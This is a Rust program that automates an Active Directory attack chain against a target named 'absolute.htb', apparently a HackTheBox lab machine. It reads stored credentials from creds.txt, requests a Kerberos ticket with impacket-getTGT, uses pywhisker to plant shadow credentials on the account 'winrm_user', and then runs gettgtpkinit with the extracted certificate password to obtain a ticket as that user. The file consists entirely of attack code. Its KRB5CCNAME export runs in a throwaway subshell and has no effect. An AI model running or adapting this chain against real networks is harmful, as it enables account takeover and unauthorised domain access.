use std::process::Command;
use std::fs::File;
use std::io::{self, BufRead, BufReader};
use regex::Regex;

pub fn run () {
    println!("Re-Grabbing m.lovegod TGT");
    run_impacket_gettgt_third_user();
    println!("Running pywhisker...");
    run_pywhisker(); 
}

fn run_impacket_gettgt_third_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the third line from the creds.txt file
    let third_line = reader.lines().nth(2).expect("Unable to read third line");
    let creds = third_line.expect("Unable to parse third line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");

        println!("Exported {}", ccache_filename);
    }
}

fn run_pywhisker() {
    // Prompt the user for the location of pywhisker.py
    println!("Please enter the path to pywhisker.py:");
    let mut pywhisker_path = String::new();
    io::stdin()
        .read_line(&mut pywhisker_path)
        .expect("Failed to read input");

    let pywhisker_path = pywhisker_path.trim();

    // Prepare and run the command with the specified arguments
    let output = Command::new("python3")
        .arg(pywhisker_path)
        .arg("-d")
        .arg("absolute.htb")
        .arg("-u")
        .arg("m.lovegod")
        .arg("-t")
        .arg("winrm_user")
        .arg("-k")
        .arg("--no-pass")
        .arg("--action")
        .arg("add")
        .output()
        .expect("failed to execute pywhisker.py");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Extract PFX file name and password from the output
    let pfx_regex = Regex::new(r"Saved PFX \(#PKCS12\) certificate & key at path: (\S+\.pfx)").unwrap();
    let password_regex = Regex::new(r"Must be used with password: (\S+)").unwrap();

    if let Some(pfx_captures) = pfx_regex.captures(&output_str) {
        let pfx_file_name = pfx_captures.get(1).map_or("", |m| m.as_str());
        println!("PFX file name: {}", pfx_file_name);
    
        if let Some(password_captures) = password_regex.captures(&output_str) {
            let password = password_captures.get(1).map_or("", |m| m.as_str());
            println!("Password: {}", password);
    
            // Run the gettgtpkinit function with the extracted PFX file name and password
            println!("Running gettgtpkinit with new PFX file and Password!");
            run_gettgtpkinit(&pfx_file_name, &password);
        } else {
            println!("Password not found in the output.");
        }
    } else {
        println!("PFX file name not found in the output.");
    }
}

fn run_gettgtpkinit(pfx_file_name: &str, pfx_password: &str) {
    // Prompt the user for the location of gettgtpkinit.py
    println!("Please enter the path to gettgtpkinit.py:");
    let mut gettgtpkinit_path = String::new();
    io::stdin()
        .read_line(&mut gettgtpkinit_path)
        .expect("Failed to read input");

    let gettgtpkinit_path = gettgtpkinit_path.trim();

    // Prepare and run the command with the specified arguments
    let output = Command::new("python3")
        .arg(gettgtpkinit_path)
        .arg("absolute.htb/winrm_user")
        .arg("-cert-pfx")
        .arg(pfx_file_name)
        .arg("-pfx-pass")
        .arg(pfx_password)
        .arg("winrmccache")
        .output()
        .expect("Failed to execute gettgtpkinit.py");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}
